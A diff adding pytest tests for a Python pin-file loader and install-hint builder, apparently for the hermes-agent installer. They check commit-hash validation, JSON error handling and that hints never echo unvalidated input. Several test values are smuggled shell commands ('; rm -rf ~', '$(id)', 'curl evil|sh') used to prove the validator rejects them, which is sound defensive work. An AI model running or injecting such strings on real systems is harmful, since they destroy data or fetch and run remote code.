@@ -117,3 +117,66 @@ def test_install_hint_uses_upstream_installer_commit():
     assert "install.sh" in h and "--commit " + want["commit"] in h
     assert "snap" in hp.install_hint(want, "/snap/bin/hermes-agent")
     assert "ls-remote" in hp.install_hint({"ref": "v99.0.0", "commit": None})
+
+
+# --- Boundary fix-forwards (a) (b) (d) -------------------------------------------------------------
+
+def _pins(tmp_path, chans, **top):
+    p = tmp_path / "pins.json"
+    p.write_text(json.dumps(dict({"python": "3.14", "channels": chans}, **top)))
+    return str(p)
+
+
+GOOD = {"bleeding": {"ref": "v1.2.3", "commit": "a" * 40}, "stable": {"ref": "v1.2.2", "commit": "b" * 40}}
+
+
+@pytest.mark.parametrize("commit", ["abc123", "A" * 40, "a" * 39 + "; rm -rf ~", "$(id)", 40, "a" * 41])
+def test_commit_must_be_40_lower_hex(tmp_path, commit):
+    chans = json.loads(json.dumps(GOOD)); chans["stable"]["commit"] = commit
+    with pytest.raises(hp.PinError, match="40 lowercase hex"):
+        hp.load_pins(_pins(tmp_path, chans))
+
+
+def test_commit_may_be_absent(tmp_path):
+    chans = json.loads(json.dumps(GOOD)); del chans["stable"]["commit"]
+    assert hp.load_pins(_pins(tmp_path, chans))["channels"]["stable"].get("commit") is None
+
+
+def test_malformed_json_is_a_pin_error_not_a_traceback(tmp_path, monkeypatch, capsys):
+    p = tmp_path / "pins.json"; p.write_text("{not json")
+    with pytest.raises(hp.PinError, match="not valid JSON"):
+        hp.load_pins(str(p))
+    monkeypatch.setattr(hp, "PINS", str(p))
+    monkeypatch.setattr(hp.load_pins, "__defaults__", (str(p),))
+    assert hp.main(["resolve", "--offline"]) == 2
+    err = capsys.readouterr().err
+    assert "not valid JSON" in err and "Traceback" not in err
+
+
+def test_unreadable_and_wrong_shape(tmp_path):
+    with pytest.raises(hp.PinError, match="cannot read"):
+        hp.load_pins(str(tmp_path / "absent.json"))
+    p = tmp_path / "list.json"; p.write_text("[]")
+    with pytest.raises(hp.PinError, match="no channels"):
+        hp.load_pins(str(p))
+
+
+def test_missing_stable_entry_is_an_error_not_bleeding(tmp_path):
+    with pytest.raises(hp.PinError, match="no stable entry"):
+        hp.load_pins(_pins(tmp_path, {"bleeding": GOOD["bleeding"]}))
+    pins = {"python": "3.14", "channels": {"bleeding": GOOD["bleeding"]}}
+    with pytest.raises(hp.PinError, match="no stable entry"):
+        hp.resolve_ref("stable", environ={}, pins=pins, chmod=None)
+
+
+def test_install_hint_fetches_install_sh_from_the_pinned_commit():
+    want = {"ref": "v1.2.3", "commit": "c" * 40}
+    h = hp.install_hint(want, "/home/u/.local/bin/hermes")
+    assert "raw.githubusercontent.com/NousResearch/hermes-agent/%s/scripts/install.sh" % ("c" * 40) in h
+    assert "hermes-agent.nousresearch.com/install.sh" not in h
+    assert "nousresearch.com/install.sh" not in hp.install_hint({"ref": "v1.2.3", "commit": None})
+
+
+def test_install_hint_never_prints_an_unvalidated_commit():
+    h = hp.install_hint({"ref": "v1.2.3", "commit": "deadbeef; curl evil|sh"}, "/home/u/.local/bin/hermes")
+    assert "evil" not in h and "ls-remote" in h
